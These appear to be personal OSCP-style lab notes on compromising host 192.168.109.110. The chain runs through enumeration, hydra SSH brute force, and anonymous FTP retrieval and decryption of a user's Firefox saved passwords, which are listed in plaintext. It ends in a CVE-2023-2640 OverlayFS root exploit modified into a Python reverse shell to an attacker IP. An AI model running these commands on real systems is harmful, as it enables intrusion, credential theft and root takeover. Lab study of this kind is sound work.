192.168.109.110
========================

# Enumeration

    sudo nmap_enum 192.168.109.110 | tee nmap_output.txt
    
    
![qownnotes-media-ujOlCr](../media/qownnotes-media-ujOlCr.png)

FTP Anonymous login

    ftp -a 192.168.109.110
    
    ftp -a -A 192.168.109.110
    
NÃ£o funcionou:
    wget -r ftp://192.168.109.110/interns
    
    
![qownnotes-media-RNvOdi](../media/qownnotes-media-RNvOdi.png)

    gobuster dir -u http://192.168.109.110 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_gobuster.txt"
    
    gobuster dir -u http://192.168.109.110:443 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_gobuster.txt"
    
![qownnotes-media-UlgSlN](../media/qownnotes-media-UlgSlN.png)

![qownnotes-media-fmWmxT](../media/qownnotes-media-fmWmxT.png)

![qownnotes-media-xGFhtW](../media/qownnotes-media-xGFhtW.png)


    sudo nmap -p- -Pn -n -T5 192.168.109.110 | tee nmap_fullports_output.txt

![qownnotes-media-VWXCqH](../media/qownnotes-media-VWXCqH.png)

    nikto -host http://192.168.109.110 -T x 6 | tee nikto_output.txt

    nikto -host http://192.168.109.110:443 -T x 6 | tee nikto_output.txt

![qownnotes-media-dGzwcP](../media/qownnotes-media-dGzwcP.png)


    cewl http://192.168.109.110/ > users_temp.txt
    
Add some possible names

![qownnotes-media-UZcqzl](../media/qownnotes-media-UZcqzl.png)
    

    hydra -L users_temp.txt -P /usr/share/wordlists/rockyou.txt 192.168.109.110 ssh
 
    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn 192.168.109.110 | tee nmap_udp_output.txt

![qownnotes-media-mllltf](../media/qownnotes-media-mllltf.png)

    sudo nmap -p- -Pn -n -T5 192.168.109.110 | tee nmap_fullports_output.txt

![qownnotes-media-UKeKYq](../media/qownnotes-media-UKeKYq.png)

    nmap -Pn -sV -p 21 --script="banner,(ftp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "tcp_21_ftp_nmap.txt" 192.168.109.110
    
![qownnotes-media-fAKVky](../media/qownnotes-media-fAKVky.png)

    hydra -l ashea -P /usr/share/wordlists/rockyou.txt 192.168.109.110 sshhydra -l ashea -P /usr/share/wordlists/rockyou.txt 192.168.109.110 ssh

# Exploitation


    ftp -a -A 192.168.109.110
    
    cd interns/backup/users/malika/
    
    cd .mozilla
    
    cd firefox/3ot0ydzb.default
    
    ls -all
    
![qownnotes-media-PWuUSz](../media/qownnotes-media-PWuUSz.png)

    mget *
    
![qownnotes-media-aYGtAw](../media/qownnotes-media-aYGtAw.png)

![qownnotes-media-xWZyUM](../media/qownnotes-media-xWZyUM.png)

![qownnotes-media-nsQEzS](../media/qownnotes-media-nsQEzS.png)

    git clone https://github.com/lclevy/firepwd.git
    cd /opt
    sudo virtualenv env
    source env/bin/activate
    sudo chown -R /opt/env
    pip install -r requirements.txt
    
    
    python firepwd.py -d /media/owncloud/Area_de_trabalho/estudos/oscp/prova2/192_168_109_110/ftp/temp

![qownnotes-media-aEOzwj](../media/qownnotes-media-aEOzwj.png)

![qownnotes-media-rjIdDY](../media/qownnotes-media-rjIdDY.png)

Credenciais obtidas:

malika
Anisoptera_Odonata4!


0w3ns4Life@1!
M@lik@870322
P@$$w0rD!001
Malika_Odonata4!



    ssh malika@192.168.109.110ssh malika@192.168.109.110
    Anisoptera_Odonata4!<ENTER>
    
![qownnotes-media-HISpLB](../media/qownnotes-media-HISpLB.png)

![qownnotes-media-gnyQOv](../media/qownnotes-media-gnyQOv.png)

# Privilege Escalation


https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/

Original

    unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; 
    setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"id\")'"

Editado:

    unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
    setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import socket,subprocess,os;os.setuid(0);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.109\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    
![qownnotes-media-PCuAdV](../media/qownnotes-media-PCuAdV.png)

![qownnotes-media-KIiCHK](../media/qownnotes-media-KIiCHK.png)


    /bin/bash -i
    
![qownnotes-media-isgicW](../media/qownnotes-media-isgicW.png)


    ps aux
    
    